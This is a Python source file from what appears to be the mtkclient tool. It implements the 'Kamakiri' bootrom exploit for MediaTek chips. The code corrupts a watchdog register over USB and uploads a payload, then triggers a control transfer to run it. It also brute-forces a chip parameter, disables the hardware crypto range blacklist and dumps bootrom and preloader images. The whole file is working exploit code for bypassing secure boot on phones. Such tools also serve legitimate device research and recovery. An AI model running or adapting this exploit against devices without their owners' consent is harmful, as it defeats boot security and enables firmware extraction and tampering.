#!/usr/bin/python3
# -*- coding: utf-8 -*-
# (c) B.Kerler 2018-2025 GPLv3 License
import logging
import time
import os
from binascii import hexlify
from struct import pack, unpack

from mtkclient.Library.exploit_handler import Exploitation
from mtkclient.Library.gui_utils import LogBase, progress
from mtkclient.Library.utils import revdword
from mtkclient.Library.Connection.usblib import usb


class Kamakiri(Exploitation, metaclass=LogBase):

    def __init__(self, mtk, loglevel=logging.INFO):
        super().__init__(mtk, loglevel)

    def exploit(self, payload, payloadaddr):
        addr = self.mtk.config.chipconfig.watchdog + 0x50
        self.mtk.preloader.write32(addr, [revdword(payloadaddr)])
        for i in range(0, 0xF):
            self.mtk.preloader.read32(addr - (0xF - i) * 4, 0xF - i + 1)
        self.mtk.port.echo(b"\xE0")
        self.mtk.port.echo(pack(">I", len(payload)))
        status = int.from_bytes(self.mtk.port.usbread(2), byteorder="little")
        if status:
            raise Exception("Kamakiri Payload is too large")
        self.mtk.port.usbwrite(payload)
        self.mtk.port.usbread(2)
        self.mtk.port.usbread(2)

        # noinspection PyProtectedMember
        udev = usb.core.find(idVendor=0x0E8D, idProduct=0x3)
        try:
            # noinspection PyProtectedMember
            udev._ctx.managed_claim_interface = lambda *args, **kwargs: None
        except AttributeError as e:
            raise RuntimeError("libusb is not installed for port {}".format(udev.dev.port)) from e

        try:
            udev.ctrl_transfer(0xA1, 0, 0, self.var1, 0)
        except usb.core.USBError as e:
            self.lasterror = str(e)
            del udev
        return True

    def bruteforce(self, args, startaddr=0x9900):
        var1 = self.chipconfig.var1
        filename = os.path.join(self.pathconfig.get_payloads_path(), "generic_dump_payload.bin")
        try:
            with open(filename, "rb") as rf:
                payload = rf.read()
                self.info(f"Loading payload from {filename}, {hex(len(payload))} bytes")
        except FileNotFoundError:
            self.info(f"Couldn't open {filename} for reading.")
            return False

        exploittype = 1
        for i in range(var1, 0xFF):
            var1 = i
            self.warning("Trying var1 of %02X, please reconnect/connect device into bootrom mode" % var1)
            while True:
                self.mtk.init()
                self.mtk.preloader.display = False
                if self.mtk.preloader.init():
                    addr = self.mtk.config.chipconfig.brom_payload_addr
                    rmtk = self.mtk.crasher(display=False)
                    try:
                        filename = args.filename
                        if filename is None:
                            cpu = ""
                            if rmtk.config.cpu != "":
                                cpu = "_" + rmtk.config.cpu
                            filename = "brom" + cpu + "_" + hex(rmtk.config.hwcode)[2:] + ".bin"
                        try:
                            self.var1 = var1
                            self.da_payload(payload, addr, True, exploittype)
                            if self.dump_brom(filename):
                                self.warning("Found a possible var1 of 0x%x" % var1)
                                return True
                        except Exception as e:
                            print(e)
                            rmtk.port.close()
                            time.sleep(0.1)
                            del rmtk
                    except Exception as err:
                        self.debug(str(err))
                        time.sleep(0.1)
                        pass
                    break

        self.warning(f"Var1 of {hex(var1)} possibly failed, please wait a few seconds " +
                     "and then reconnect the mobile to bootrom mode")

        if var1 == 0xFF:
            self.error("Couldn't find the right var1 value.")
        self.close()
        return False

    def dump_brom(self, filename, dump_ptr=None, length=0x20000):
        try:
            with open(filename, 'wb') as wf:
                length = self.mtk.port.usbread(4)
                length = int.from_bytes(length, 'big')
                pg = progress(prefix='Progress:', total=length)
                rlen = min(length, 0x20000)
                for i in range(length // rlen):
                    data = self.mtk.port.usbread(rlen)
                    wf.write(data)
                    pg.update(len(data))
                pg.done()
                return True
        except Exception as e:
            self.error(f"Error on opening {filename} for writing: {str(e)}")
            return False

    def dump_preloader(self, filename=None):
        rfilename = None
        data = None
        length = unpack("<I", self.mtk.port.usbread(4))[0]
        if length > 0:
            data = self.mtk.port.usbread(length)
            idx = data.find(b"MTK_BLOADER_INFO")
            if idx != -1:
                rfilename = data[idx + 0x1B:idx + 0x1B + 0x30].rstrip(b"\x00").decode('utf-8')
        if filename is None:
            return data, rfilename
        else:
            self.info("Dump preloader")
            with open(filename, 'wb') as wf:
                wf.write(data)

    def payload(self, payload, daaddr):
        ptype = "kamakiri"
        self.hwcrypto.disable_range_blacklist(ptype, self.mtk.preloader.run_ext_cmd)
        try:
            while len(payload) % 4 != 0:
                payload += b"\x00"

            words = []
            for x in range(len(payload) // 4):
                word = payload[x * 4:(x + 1) * 4]
                word = unpack("<I", word)[0]
                words.append(word)

            self.info("Sending payload")
            self.write32(self, words)

            self.info("Running payload ...")
            self.write32(self.mtk.config.chipconfig.blacklist[0][0] + 0x40, daaddr)
            return True
        except Exception as e:
            self.error("Failed to load payload file. Error: " + str(e))
        return False

    def runpayload(self, payload, ack=0xA1A2A3A4, addr=None, dontack=False):
        self.info("Kamakiri Run")
        if addr is None:
            addr = self.chipconfig.brom_payload_addr
        if self.da_payload(payload, addr, True):
            if dontack:
                return ack
            result = self.usbread(4)
            if result == pack(">I", ack):
                return ack
            else:
                self.info("Error, payload answered instead: " + hexlify(result).decode('utf-8'))
        return None
